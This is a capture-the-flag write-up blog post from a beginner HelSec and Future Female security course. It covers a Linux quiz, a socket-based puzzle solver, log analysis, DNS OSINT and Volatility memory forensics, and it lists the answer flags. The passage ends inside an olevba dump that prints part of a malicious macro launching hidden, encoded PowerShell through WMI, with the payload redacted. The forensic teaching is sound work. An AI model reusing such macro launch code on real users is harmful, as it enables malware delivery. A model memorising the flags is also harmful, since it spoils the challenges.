@@ -1,0 +1,1265 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="ie=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=author content="Juho Jauhiainen ">
+<meta name=description content="Cyber Security Essentials is a course series I was organizing in HelSec with Future Female. CSE had 6 lectures and the CTF was organized at the end of the course. The course was aimed for female who are interested working in technical side of the Cyber Security OR just started in the field. This CTF was made 99% by me alone and was purposed to be entry level. More information about the course series can be found from here.">
+<meta name=keywords content="dfir forensics malware">
+<meta name=robots content="noodp">
+<meta name=theme-color content>
+<link rel=canonical href=https://who1s.github.io/posts/2020/07/0x06-cyber-security-essentials-ctf/>
+<title>
+[0x06] Cyber Security Essentials CTF :: DFIR
+</title>
+<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
+<link rel=stylesheet href=https://who1s.github.io/main.29c2c8c3fc9cf748254138351f142ac2833b208a68e83aec126edc98b59efef2.css>
+<link rel=apple-touch-icon sizes=180x180 href=https://who1s.github.io/apple-touch-icon.png>
+<link rel=icon type=image/png sizes=32x32 href=https://who1s.github.io/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=https://who1s.github.io/favicon-16x16.png>
+<link rel=manifest href=https://who1s.github.io/site.webmanifest>
+<link rel=mask-icon href=https://who1s.github.io/safari-pinned-tab.svg color=#1b1c1d>
+<link rel="shortcut icon" href=https://who1s.github.io/favicon.ico>
+<meta name=msapplication-TileColor content="#1b1c1d">
+<meta name=theme-color content="#1b1c1d">
+<meta itemprop=name content="[0x06] Cyber Security Essentials CTF">
+<meta itemprop=description content="Cyber Security Essentials is a course series I was organizing in HelSec with Future Female. CSE had 6 lectures and the CTF was organized at the end of the course. The course was aimed for female who are interested working in technical side of the Cyber Security OR just started in the field. This CTF was made 99% by me alone and was purposed to be entry level. More information about the course series can be found from here."><meta itemprop=datePublished content="2020-07-23T14:00:00+00:00">
+<meta itemprop=dateModified content="2020-07-23T14:00:00+00:00">
+<meta itemprop=wordCount content="5256"><meta itemprop=image content="https://who1s.github.io">
+<meta itemprop=keywords content>
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://who1s.github.io">
+<meta name=twitter:title content="[0x06] Cyber Security Essentials CTF">
+<meta name=twitter:description content="Cyber Security Essentials is a course series I was organizing in HelSec with Future Female. CSE had 6 lectures and the CTF was organized at the end of the course. The course was aimed for female who are interested working in technical side of the Cyber Security OR just started in the field. This CTF was made 99% by me alone and was purposed to be entry level. More information about the course series can be found from here.">
+<meta property="og:title" content="[0x06] Cyber Security Essentials CTF">
+<meta property="og:description" content="Cyber Security Essentials is a course series I was organizing in HelSec with Future Female. CSE had 6 lectures and the CTF was organized at the end of the course. The course was aimed for female who are interested working in technical side of the Cyber Security OR just started in the field. This CTF was made 99% by me alone and was purposed to be entry level. More information about the course series can be found from here.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://who1s.github.io/posts/2020/07/0x06-cyber-security-essentials-ctf/"><meta property="og:image" content="https://who1s.github.io"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2020-07-23T14:00:00+00:00">
+<meta property="article:modified_time" content="2020-07-23T14:00:00+00:00">
+<meta property="article:section" content="tools">
+<meta property="article:section" content="training">
+<meta property="article:published_time" content="2020-07-23 14:00:00 +0000 UTC">
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-138581360-1','auto'),ga('send','pageview'))</script>
+</head>
+<body>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=https://who1s.github.io/ style=text-decoration:none>
+<div class=logo>
+<span class=logo__mark>></span>
+<span class=logo__text>$ cd /cases/</span>
+<span class=logo__cursor style=background-color:#0047ab>
+</span>
+</div>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class=menu__inner><li><a href=https://who1s.github.io/about/>About</a></li><li><a href=https://who1s.github.io/posts/>Posts</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<main class=post>
+<div class=post-info>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+25 minutes
+</p>
+</div>
+<article>
+<h1 class=post-title>
+<a href=https://who1s.github.io/posts/2020/07/0x06-cyber-security-essentials-ctf/>[0x06] Cyber Security Essentials CTF</a>
+</h1>
+<div class=post-content>
+<blockquote>
+<p>Cyber Security Essentials is a course series I was organizing in <a href=https://helsec.fi>HelSec</a> with <a href=https://www.futurefemale.com>Future Female</a>. CSE had 6 lectures and the CTF was organized at the end of the course. The course was aimed for female who are interested working in technical side of the Cyber Security OR just started in the field. This CTF was made 99% by me alone and was purposed to be entry level. More information about the course series can be found from <a href=https://www.futurefemale.com/news/future-female-x-helsec-cyber-security-essentials/>here</a>.</p>
+</blockquote>
+<h1 id=results>Results</h1>
+<p>The competition was hosted on CTFd at <a href=https://ctf.helsec.fi>ctf.helsec.fi</a> and here are the top competitors:
+<img src=https://who1s.github.io/assets/images/cse_top10.png alt=Screenshot></p>
+<p>Congratz all! ᕕ( ՞ ᗜ ՞ )ᕗ</p>
+<hr>
+<h1 id=challenges---q-general>Challenges -> Q: General</h1>
+<h2 id=bash>Bash</h2>
+<blockquote>
+<p>Q: Recap of the Linux commands.
+Download the file and run it.
+P.S. You can cheat in this but I bet it&rsquo;s harder than doing it properly</p>
+</blockquote>
+<p>Purposed way:</p>
+<pre tabindex=0><code>./bash
+HelSec x Future Female
+-----------------------
+exit = exit commandline
+start = start questions
+flag = print flag
+hi = say hi
+----------------------
+# flag
+Answer the questions correctly first...
+#
+#
+# start
+What command lets you run super user commands?
+Answer: sudo
+Which command changes password on Linux?
+Answer: passwd
+Which Linux text editor we used in the course?
+Answer: vim
+Which command can be used to calculate md5 hash of a file?
+Answer: md5sum
+What command will UPDATE installed packages (not just the repositories)?
+Answer: apt-get upgrade
+Get the flag with command flag
+# flag
+flag{LINUX_IZ_S0_EZ!!}
+# exit
+</code></pre><p>The mentioned unintended way would be reversing it. =)</p>
+<p>However, the flag is: flag{LINUX_IZ_S0_EZ!!}</p>
+<h2 id=numb3rs>numb3rs</h2>
+<blockquote>
+<p>Q: Hello, friend. You don&rsquo;t know me, but I know you. I want to play a game. There is only one combination of numbers that gives you the answer. Know what to do. You better hurry up. Make your choice.</p>
+</blockquote>
+<p>This is a challenge I made last year for <a href=https://disobey.fi>Disobey</a> and <a href=https://nixuchallenge.com>Nixu Challenge</a>. The idea is to make a script that solves the puzzle.</p>
+<p><img src=https://who1s.github.io/assets/images/play_games.png alt=Screenshot></p>
+<p>Here&rsquo;s my quick and dirty version (note that there&rsquo;s lot easier ways to solve this than the code I wrote for this walk-through):</p>
+<pre tabindex=0><code>!/usr/bin/env python3
+
+import socket
+import time
+import os
+import sys
+
+class color:
+    red = &quot;\x1b[31m&quot;
+    green = &quot;\x1b[32m&quot;
+    default = &quot;\x1b[39m&quot;
+
+def receive(s):
+    print(&quot;{}[Reveived data]{}\n\n&quot;.format(color.red, color.default))
+    data = b&quot;&quot;
+    while True:
+        # Receive data max 4096 bytes at a time
+        pack = s.recv(4096)
+        data += pack
+        # Break the loop if data is less than 1024 bytes in size
+        if len(pack) &lt; 1024:
+            break
+    # Print the output so we can more easily read how the we are doing
+    print(&quot;{}&quot;.format(data.decode(&quot;UTF-8&quot;)))
+    if &quot;flag&quot; in data.decode(&quot;UTF-8&quot;):
+        sys.exit(1)        
+    # Sleep while before returning
+    time.sleep(0.3)
+    return data.decode(&quot;UTF-8&quot;)
+
+def send_data(s, data):
+    print(&quot;{}[Sending data]{}\n{}&quot;.format(color.green,color.default,str(data)))
+    s.send(str.encode(data))
+    # Sleep while before returning
+    time.sleep(0.3)
+    return
+
+def get_correct(data):
+    correct = &quot;&quot;
+    for char in data.split():
+        if char.isdigit():
+            return char
+
+def main():
+    while True:
+        # Connect to server
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((&quot;64.225.65.251&quot;, 1337))
+        # Get the first response
+        response=receive(s)
+
+        # Get the second response if necessary (sometimes the server sends it in the first response)
+        if &quot;61v3 numb3r&quot; not in response:
+            response=receive(s)
+
+        # Check if our sq.txt file exists, the file is used to store and read results. If not, send '1337' as response otherwise loop the file
+        if os.path.exists('./sq.txt'):
+            with open(&quot;sq.txt&quot;, &quot;r&quot;) as f:
+                for value in f:
+                    send_data(s, value.replace(&quot;\n&quot;,&quot;&quot;))
+                    response=receive(s)
+
+        # Send 1337 or any other randon number
+        send_data(s, &quot;1337&quot;)
+        # Get response and the correct number
+        response=receive(s)
+        # Close the connection
+        s.close()
+        correct_number=get_correct(response)
+
+        # Write the right number to our file
+        if os.path.exists('./sq.txt'):
+            armode = 'a'
+        else:
+            armode = 'w'
+        f = open(&quot;./sq.txt&quot;, armode)
+        f.write(correct_number+&quot;\n&quot;)
+        f.close()
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre><p>Running the code will print the flag after a while</p>
+<pre tabindex=0><code>~$ python3 solve.py
+&lt;-- Lot of output redacted --&gt;
+flag{ApPRoVEd_leE7_HAxOr_8END1n9_7hE_71mE}
+</code></pre><p>The flag is: flag{ApPRoVEd_leE7_HAxOr_8END1n9_7hE_71mE}</p>
+<hr>
+<h1 id=challenges---q-security-operations>Challenges -> Q: Security Operations</h1>
+<h2 id=soc-1>SOC #1</h2>
+<blockquote>
+<p>Q: What is the centralized log system called (abbreviation)?</p>
+</blockquote>
+<p><a href=https://en.wikipedia.org/wiki/Security_information_and_event_management>SIEM</a></p>
+<h2 id=soc-2>SOC #2</h2>
+<blockquote>
+<p>Q: Which HTTP command lists all available methods (GET, POST etc.)?</p>
+</blockquote>
+<p><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS>OPTIONS</a></p>
+<h2 id=soc-3>SOC #3</h2>
+<blockquote>
+<p>Q: There&rsquo;s Linux/Tsunami DOS related traffic in the access.log. What is the corresponding IP address of potentially infected host?</p>
+</blockquote>
+<p>Google: &ldquo;Linux/Tsunami DOS&rdquo; and find out <a href=https://doc.emergingthreats.net/bin/view/Main/2022760>User-Agent x00_-gawa.sa.pilipinas.2015</a>.</p>
+<pre tabindex=0><code>~$ grep &quot;x00_-gawa.sa.pilipinas.2015&quot; access.log
+138.121.183.58 - - [22/Sep/2015:13:23:27 +0000] &quot;GET /Ringing.at.your.dorbell! HTTP/1.0&quot; 404 459 &quot;http://google.com/search?q=2+guys+1+horse&quot; &quot;x00_-gawa.sa.pilipinas.2015&quot;
+37.17.130.36 - - [01/Oct/2015:01:26:48 +0000] &quot;GET /Ringing.at.your.dorbell! HTTP/1.0&quot; 404 459 &quot;http://google.com/search?q=2+guys+1+horse&quot; &quot;x00_-gawa.sa.pilipinas.2015&quot;
+37.17.130.36 - - [01/Oct/2015:01:26:48 +0000] &quot;GET / HTTP/1.0&quot; 200 329 &quot;-&quot; &quot;x00_-gawa.sa.pilipinas.2015&quot;
+37.17.130.36 - - [01/Oct/2015:01:26:49 +0000] &quot;GET / HTTP/1.0&quot; 200 329 &quot;-&quot; &quot;x00_-gawa.sa.pilipinas.2015&quot;
+37.17.130.36 - - [01/Oct/2015:01:26:50 +0000] &quot;GET / HTTP/1.0&quot; 200 329 &quot;-&quot; &quot;x00_-gawa.sa.pilipinas.2015&quot;
+</code></pre><p>The answer is 37.17.130.36 (see the HTTP response 200 vs 404).</p>
+<h2 id=soc-4>SOC #4</h2>
+<blockquote>
+<p>Q: Which host has most entries in the access.log? Answer the IP address.</p>
+</blockquote>
+<pre tabindex=0><code>~$ awk '{print $1}' access.log|sort|uniq -c|sort -nr|head -n3
+     73 61.160.247.11
+     59 222.186.21.90
+     28 89.110.147.28
+</code></pre><p>Answer: 61.160.247.11</p>
+<h2 id=soc5>SOC#5</h2>
+<blockquote>
+<p>Q: IP address 61.160.247.11 has the most entiries in the access.log. How many?</p>
+</blockquote>
+<pre tabindex=0><code>~$ grep &quot;61.160.247.11&quot; access.log|wc -l
+73
+</code></pre><hr>
+<h1 id=challenges---q-osint>Challenges -> Q: OSINT</h1>
+<h2 id=osint-1>OSINT #1</h2>
+<blockquote>
+<p>Q: Investigate <a href=mailto:foo.bar@ctf.helsec.fi>foo.bar@ctf.helsec.fi</a></p>
+</blockquote>
+<p>This challenge was supposed to be simple OSINT challenge but it turned out to be impossible&mldr; because either I screwed up or pastebin deleted the paste. I &ldquo;dumped&rdquo; password for the account <a href=mailto:foo.bar@ctf.helsec.fi>foo.bar@ctf.helsec.fi</a> and if I recall right, the paste was available the next day it was uploaded. For some reason it is not listed anymore.</p>
+<h2 id=osint-2>OSINT #2</h2>
+<blockquote>
+<p>Q: Can you find anything special from foobar.helsec.fi ?</p>
+</blockquote>
+<p>DNS stuff:</p>
+<pre tabindex=0><code>~$ host foobar.helsec.fi
+foobar.helsec.fi has address 127.0.0.1
+ ~$ host -t TXT foobar.helsec.fi
+foobar.helsec.fi descriptive text &quot;c29tZXRoaW5nc3BlY2lhbC5oZWxzZWMuZmkK&quot;
+ ~$ echo &quot;c29tZXRoaW5nc3BlY2lhbC5oZWxzZWMuZmkK&quot;|base64 -d
+somethingspecial.helsec.fi
+
+
+ ~$ host somethingspecial.helsec.fi
+somethingspecial.helsec.fi has address 127.0.0.1
+ ~$ host -t TXT somethingspecial.helsec.fi
+somethingspecial.helsec.fi descriptive text &quot;c3ludHtHVVJFUl9WRl9OWUpOTEZfRkJaUkdVVkFUX1ZBX1FBRn0K&quot;
+ ~$ echo &quot;c3ludHtHVVJFUl9WRl9OWUpOTEZfRkJaUkdVVkFUX1ZBX1FBRn0K&quot;|base64 -d
+synt{GURER_VF_NYJNLF_FBZRGUVAT_VA_QAF}
+~$ echo &quot;c3ludHtHVVJFUl9WRl9OWUpOTEZfRkJaUkdVVkFUX1ZBX1FBRn0K&quot;|base64 -d|rot13
+flag{THERE_IS_ALWAYS_SOMETHING_IN_DNS}
+</code></pre><h2 id=osint-3>OSINT #3</h2>
+<blockquote>
+<p>Q: Rodrigo Gonzales is slipping from OPSEC on their recent beer related social media post.</p>
+</blockquote>
+<p><a href=https://twitter.com/rodrigo_gonaz/status/1270298024774959104>https://twitter.com/rodrigo_gonaz/status/1270298024774959104</a></p>
+<pre tabindex=0><code>~$ echo &quot;ZmxhZ3swUFMzQ30K&quot;|base64 -d
+flag{0PS3C}
+</code></pre><hr>
+<h1 id=challenges---q-memory-forensics>Challenges -> Q: Memory forensics</h1>
+<h2 id=volatility-profile>Volatility profile</h2>
+<blockquote>
+<p>Q: What is the correct Volatility profile of the image file?</p>
+</blockquote>
+<p>The profile can be determined using imageinfo and kdbgscan. The kdbgscan gives following result:</p>
+<pre tabindex=0><code>**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_14393 (6.4.14393 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_14393
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_17763 (6.4.17763 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_17763
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_17134 (6.4.17134 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_17134
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_10586 (6.4.10586 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_10586
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_16299 (6.4.16299 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_16299
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win2016x64_14393 (6.4.14393 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win2016x64_14393
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_15063 (6.4.15063 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_15063
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+</code></pre><p>We can see the correct Windows build version from Version64 field:</p>
+<pre tabindex=0><code>Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+</code></pre><p>This means the right profile is Win10x64_17763.</p>
+<p>Hint: After the correct profile is determined, I suggest you to run following to save time:</p>
+<pre tabindex=0><code>for plugin in pstree pslist psscan psxview dlllist getsids handles netscan filescan malfind svcscan cmdscan consoles; do vol.py -f finalboss.mem --profile=Win10x64_17763 $plugin |tee $plugin.txt; done
+</code></pre><p>This will run some basic plugins and write text files out of them for further analysis. There are some wrappers that do this more efficiently (f.e. multithreading & dump artifacts) but this is good start. =)</p>
+<h2 id=image-time>Image time</h2>
+<blockquote>
+<p>Q: When was the image taken?</p>
+</blockquote>
+<p>The imageinfo plugin outputs following:</p>
+<pre tabindex=0><code>Suggested Profile(s) : Win10x64_17134, Win10x64_14393, Win10x64_10586, Win10x64_16299, Win2016x64_14393, Win10x64_17763, Win10x64_15063 (Instantiated with Win10x64_15063)
+           AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
+           AS Layer2 : FileAddressSpace (/home/kali/cse/mem/finalboss.mem)
+            PAE type : No PAE
+                 DTB : 0x1ad002L
+                KDBG : 0xf8024dab65e0L
+Number of Processors : 2
+Image Type (Service Pack) : 0
+      KPCR for CPU 0 : 0xfffff8024c998000L
+      KPCR for CPU 1 : 0xffff858058920000L
+   KUSER_SHARED_DATA : 0xfffff78000000000L
+ Image date and time : 2020-02-12 21:04:47 UTC+0000
+Image local date and time : 2020-02-12 23:04:47 +0200
+</code></pre><p>The answer is 2020-02-12 21:04:47 UTC+0000.</p>
+<h2 id=imaging>Imaging</h2>
+<blockquote>
+<p>Q: Which software was LIKELY used to take the image?</p>
+</blockquote>
+<p>Following program has been executed few seconds before the memory dump was taken:</p>
+<pre tabindex=0><code>... 0xffff980f736ce500:FTK Imager.exe                5608   1488     22      0 2020-02-12 21:04:13 UTC+0000
+</code></pre><p>FTK Imager is also known tool for memory dumping.</p>
+<h2 id=user-name>User name</h2>
+<blockquote>
+<p>Q: What is the name of the main user on the workstation?</p>
+</blockquote>
+<p>User accounts always start with SID S-1-5-21 so we can grep that string from getsids:</p>
+<pre tabindex=0><code>~$ cat getsids.txt|grep &quot;S-1-5-21-&quot;|cut -d':' -f2|sort|uniq -c|sort -nr|head -n100
+     49  S-1-5-21-2034586335-2782532192-897599191-513 (Domain Users)
+     49  S-1-5-21-2034586335-2782532192-897599191-1001 (Rodrigo Gonzales)
+</code></pre><p>The first one is group, the second one is user (RID >= 1000). The answer is Rodrigo Gonzales</p>
+<h2 id=malicious-document>Malicious document</h2>
+<blockquote>
+<p>Q: What is the name of the suspicious macro document? Please include the file extension in the answer.</p>
+</blockquote>
+<p>Office tools are usually used to open macro documents, pslist shows Word has been executed:</p>
+<pre tabindex=0><code>~$ grep -i word pslist.txt
+0xffff980f75c52080 WINWORD.EXE            2796   1488     18        0      1      1 2020-02-12 20:56:01 UTC+0000
+</code></pre><p>Let&rsquo;s check handles of the process if there&rsquo;s something suspicious:</p>
+<pre tabindex=0><code>~$ grep 2796 handles.txt|grep -i doc
+0xffff980f7581bb40   2796              0xde4           0x12019f File             \Device\HarddiskVolume4\Users\Rodrigo Gonzales\Desktop\pystyy_vetaeae-invitation\pystyy_vetaeae-invitation.docm
+</code></pre><p>The answer is pystyy_vetaeae-invitation.docm</p>
+<h2 id=carrier>Carrier</h2>
+<blockquote>
+<p>Q: What is the process ID (PID) of the process, which started the malicious execution (e.q. opened the carrier file (the macro document))?</p>
+</blockquote>
+<p>This question is basically reversed version of the Malicious document question. Let&rsquo;s grep the name from handles and get the same output. =)</p>
+<pre tabindex=0><code>~$ grep pystyy_vetaeae-invitation.docm handles.txt
+0xffff980f7581bb40   2796              0xde4           0x12019f File             \Device\HarddiskVolume4\Users\Rodrigo Gonzales\Desktop\pystyy_vetaeae-invitation\pystyy_vetaeae-invitation.docm
+</code></pre><p>This can also be confirmed by checking cmdlines of every executed porcess:</p>
+<pre tabindex=0><code>~$ grep pystyy_veta cmdline.txt -B1
+WINWORD.EXE pid:   2796
+Command line : &quot;C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE&quot; /n &quot;C:\Users\Rodrigo Gonzales\Desktop\pystyy_vetaeae-invitation\pystyy_vetaeae-invitation.docm&quot; /o &quot;&quot;
+</code></pre><p>The answer is 2796.</p>
+<h2 id=carrier-time>Carrier time</h2>
+<blockquote>
+<p>Q: When the process with ID 2796 was started?</p>
+</blockquote>
+<p>Pslist has column for process start times:</p>
+<pre tabindex=0><code>~$ grep 2796 pslist.txt
+0xffff980f75c52080 WINWORD.EXE            2796   1488     18        0      1      1 2020-02-12 20:56:01 UTC+0000
+</code></pre><p>The answer is 2020-02-12-20-56-01</p>
+<h2 id=macros-macros-macros>Macros macros macros</h2>
+<blockquote>
+<p>Q: What is the process ID (PID) of the process, which WAS started by the macro document?</p>
+</blockquote>
+<p>This one is more tricky. The Word is not parent process of this process as the macros execute.</p>
+<p>We can see PowerShell process executed by WMI. This kind of behaviour should be investigated more closely and could be the one! However, we can&rsquo;t verify it without investigating the macros:</p>
+<pre tabindex=0><code>... 0xffff980f7292f240:WmiPrvSE.exe                  3416    840     10      0 2020-02-12 20:52:49 UTC+0000
+       audit: \Device\HarddiskVolume4\Windows\System32\wbem\WmiPrvSE.exe
+       cmd: C:\Windows\system32\wbem\wmiprvse.exe
+       path: C:\Windows\system32\wbem\wmiprvse.exe
+.... 0xffff980f7590d080:powershell.exe               3908   3416     14      0 2020-02-12 20:56:13 UTC+0000
+        audit: \Device\HarddiskVolume4\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        cmd:
+        path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</code></pre><p>Let&rsquo;s dump the docm and see the macros:</p>
+<pre tabindex=0><code>~$ vol.py -f finalboss.mem --profile=Win10x64_17763 dumpfiles -n -i -r \\.docm --dump-dir=files
+Volatility Foundation Volatility Framework 2.6.1
+DataSectionObject 0xffff980f7581bb40   2796   \Device\HarddiskVolume4\Users\Rodrigo Gonzales\Desktop\pystyy_vetaeae-invitation\pystyy_vetaeae-invitation.docm
+SharedCacheMap 0xffff980f7581bb40   2796   \Device\HarddiskVolume4\Users\Rodrigo Gonzales\Desktop\pystyy_vetaeae-invitation\pystyy_vetaeae-invitation.docm
+</code></pre><p>The easiest way to investigate the macros is to install oletools:</p>
+<pre tabindex=0><code>~$ pip install oletools
+</code></pre><p>Remember to add $HOME/.local/bin to path.</p>
+<pre tabindex=0><code>~$ olevba file.2796.0xffff980f72daa9b0.pystyy_vetaeae-invitation.docm.dat
+Public Function xsEC() As Variant
+        strComputer = &quot;.&quot;
+        Set objWMIService = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2&quot;)
+        Dim yQf As String
+        yQf = &quot;powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVg&quot;
+
+        &lt;-- Lot of base64 encoded PowerShell redacted --&gt;
+
+        Const HIDDEN_WINDOW = 0
+        Set objStartup = objWMIService.Get(&quot;Win32_ProcessStartup&quot;)
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
